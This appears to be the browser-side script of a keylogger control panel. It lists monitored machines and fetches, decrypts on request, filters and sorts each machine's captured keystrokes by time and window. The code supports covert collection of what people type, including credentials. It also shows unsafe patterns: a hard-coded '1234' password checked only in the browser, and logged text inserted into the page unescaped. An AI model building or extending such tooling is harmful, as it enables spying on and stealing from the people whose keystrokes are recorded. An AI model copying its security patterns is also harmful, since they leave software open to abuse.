document.addEventListener('DOMContentLoaded', function () {
    const loginForm = document.getElementById('loginForm');
    const loginPage = document.getElementById('loginPage');
    const mainPage = document.getElementById('mainPage');
    const decryptionKeyInput = document.getElementById('decryptKey');
    const computersContainer = document.getElementById('computersContainer');
    const modal = document.getElementById('keystrokesModal');
    const modalTitle = document.getElementById('modalTitle');
    const closeModal = document.querySelector('.close-modal');
    const keystrokesTableBody = document.getElementById('keystrokesTable').querySelector('tbody');
    const toggleFilterBtn = document.getElementById('toggleFilter');
    const filterForm = document.getElementById('filterForm');
    const applyFilterBtn = document.getElementById('applyFilter');
    const clearFilterBtn = document.getElementById('clearFilter');
    let sortDirection = {};

    loginForm.addEventListener('submit', function (event) {
        event.preventDefault();
        const password = document.getElementById('password').value;
        if (password === '1234') {
            loginPage.style.display = 'none';
            mainPage.style.display = 'block';
            fetchComputers();
        } else {
            alert('Incorrect password. Please try again.');
        }
    });

    /** Fetch all available computers and update the grid */
    function fetchComputers() {
        fetch('/api/machines')
            .then(response => response.json())
            .then(data => {
                computersContainer.innerHTML = '';
                data.machines.forEach(machine => {
                    const computerCard = document.createElement('div');
                    computerCard.classList.add('computer-card');
                    computerCard.innerHTML = `<h3>${machine}</h3>`;
                    computerCard.addEventListener('click', () => openKeystrokesModal(machine));
                    computersContainer.appendChild(computerCard);
                });
            })
            .catch(error => console.error('Error fetching computers:', error));
    }

    /** Open Keystrokes Modal */
    function openKeystrokesModal(machine) {
        modal.style.display = 'block';
        modalTitle.textContent = `Keystrokes for ${machine}`;
        fetchKeystrokes(machine);
    }

    /** Fetch Keystrokes for a machine using a user-supplied decryption key */
    function fetchKeystrokes(machine) {
        const userKey = decryptionKeyInput.value.trim(); // Get user-entered key
        if (!userKey) {
            alert("Please enter a decryption key.");
            return;
        }

        let url = `/api/get_keystrokes?machine=${encodeURIComponent(machine)}&key=${encodeURIComponent(userKey)}`;

        // Append filters if provided
        const date = document.getElementById('filterDate').value;
        const windowName = document.getElementById('filterWindow').value;
        const searchText = document.getElementById('filterText').value;

        if (date) url += `&date=${encodeURIComponent(date)}`;
        if (windowName) url += `&window=${encodeURIComponent(windowName)}`;
        if (searchText) url += `&searchText=${encodeURIComponent(searchText)}`;

        fetch(url)
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    alert(data.error);
                    return;
                }
                keystrokesTableBody.innerHTML = '';
                for (const [timestamp, windows] of Object.entries(data.logs)) {
                    for (const [window, keystrokes] of Object.entries(windows)) {
                        const row = document.createElement('tr');
                        row.innerHTML = `<td>${timestamp}</td><td>${window}</td><td>${keystrokes}</td>`;
                        keystrokesTableBody.appendChild(row);
                    }
                }
            })
            .catch(error => console.error('Error fetching keystrokes:', error));
    }

    /** Toggle Filter Form Visibility */
    toggleFilterBtn.addEventListener('click', () => {
        filterForm.classList.toggle('hidden');
    });

    /** Apply Filters */
    applyFilterBtn.addEventListener('click', (event) => {
        event.preventDefault();
        fetchKeystrokes(modalTitle.textContent.split(" ")[2]);
    });

    /** Clear Filters */
    clearFilterBtn.addEventListener('click', (event) => {
        event.preventDefault();
        document.getElementById('filterDate').value = '';
        document.getElementById('filterWindow').value = '';
        document.getElementById('filterText').value = '';
        fetchKeystrokes(modalTitle.textContent.split(" ")[2]);
    });

    /** Close Modal */
    closeModal.addEventListener('click', () => {
        modal.style.display = 'none';
    });

    /** Refresh Button */
    document.getElementById('refreshButton').addEventListener('click', fetchComputers);

    /** Sorting Table Columns */
    document.querySelectorAll("#keystrokesTable th").forEach(header => {
        header.addEventListener('click', () => {
            const column = header.getAttribute("data-sort");
            if (!column) return;

            sortDirection[column] = sortDirection[column] === 'asc' ? 'desc' : 'asc';

            const rows = Array.from(keystrokesTableBody.querySelectorAll('tr'));

            rows.sort((rowA, rowB) => {
                const cellA = rowA.cells[header.cellIndex].textContent.trim();
                const cellB = rowB.cells[header.cellIndex].textContent.trim();

                if (column === "timestamp") {
                    return sortDirection[column] === 'asc' ? new Date(cellA) - new Date(cellB) : new Date(cellB) - new Date(cellA);
                }
                return sortDirection[column] === 'asc' ? cellA.localeCompare(cellB) : cellB.localeCompare(cellA);
            });

            keystrokesTableBody.innerHTML = "";
            rows.forEach(row => keystrokesTableBody.appendChild(row));
        });
    });
});
